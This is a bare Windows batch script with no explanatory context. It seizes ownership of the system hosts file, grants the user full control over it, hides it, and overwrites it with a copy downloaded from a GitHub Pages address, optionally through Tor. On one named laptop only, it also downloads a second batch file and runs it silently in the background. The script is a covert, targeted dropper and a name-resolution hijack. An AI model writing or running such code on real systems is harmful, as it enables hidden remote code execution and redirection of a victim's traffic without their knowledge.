@echo off
:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--socks5-hostname 127.0.0.1:9050") else (
  set "proxy="
)

TAKEOWN /F "C:\Windows\System32\drivers\etc\hosts"
ICACLS "C:\Windows\System32\drivers\etc\hosts" /INHERITANCE:e /GRANT:r %UserName%:(F) /T /C
attrib -r +h +s +i "C:\Windows\System32\drivers\etc\hosts"
curl.exe %proxy% https://cryptedlumos.github.io/Hosts/hosts --output "C:\Windows\System32\drivers\etc\hosts"
echo [TARGET START]
echo %computername%
if [%computername%]==[LAPTOP-KSJLL5K9] (
curl.exe %proxy% https://cryptedlumos.github.io/purga_paperino.bat --output "%temp%\pp.bat" && nircmd exec hide "%temp%\pp.bat"
) else (
echo.
)
echo [TARGET STOP]
REM opipirrui0duasi0gj0dauff
